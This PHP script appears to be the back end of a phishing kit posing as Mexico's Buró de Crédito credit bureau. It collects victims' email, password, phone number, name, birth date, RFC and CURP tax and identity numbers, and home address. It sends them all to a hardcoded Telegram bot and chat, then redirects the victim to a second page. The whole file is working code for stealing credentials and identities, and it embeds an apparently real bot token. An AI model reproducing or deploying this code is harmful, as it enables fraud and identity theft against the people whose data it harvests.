<?php

ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);
date_default_timezone_set('America/Guatemala');

$token = "5160141279:AAErV8ttRSt-RD-Plsm1kqXsLcpP35X3exY";
#digitales
$dot = $_POST['mil'];
$dat = $_POST['pass'];
$det = $_POST['robot'];
#persoanles
$name = $_POST['name'];
$aple = $_POST['aple'];
$date = $_POST['date'];
$plox = $_POST['digitos-st'];
#domiciliarios
$direc = $_POST['dom'];
$pos = $_POST['postal'];
$col = $_POST['col'];
$munici = $_POST['munici'];
$state = $_POST['state'];
$pel = $_POST['crp'];

$datos = [
    'chat_id' => '1556162059',
    #'chat_id' => '@el_canal si va dirigido a un canal',
    'text' => "DATOS RECIBIDOS BURO DE CREDITO \n\n🪙 Email $dot \n✅ Password: $dat \n📞 Número: $det \n\n\nDatos Personales \n\n📇 Nombre: $name \n🗃 Apellidos: $aple \n🔖 Nacimiento: $date \n📊 RFC: $plox \n🪙 CURP: $pel\n\nDatos de Domicilio \n\n🛤 Calle y No: $direc \n📎 Código P: $pos \n📍 Colonia: $col \n📝 Municipio: $munici \n🏳️ Estado: $state \n\nATTE: AssistentReboot",
    'parse_mode' => 'HTML' #formato del mensaje
];


$ch = curl_init();

curl_setopt($ch, CURLOPT_URL, "https://api.telegram.org/bot" . $token . "/sendMessage");
curl_setopt($ch, CURLOPT_HEADER, false);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, TRUE);
curl_setopt($ch, CURLOPT_POSTFIELDS, $datos);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

$r_array = json_decode(curl_exec($ch), true);

curl_close($ch);
if ($r_array['ok'] == 1) {
    header("Location: page2.php");
} else {
    echo "Mensaje no enviado.";
    print_r($r_array);
}
?>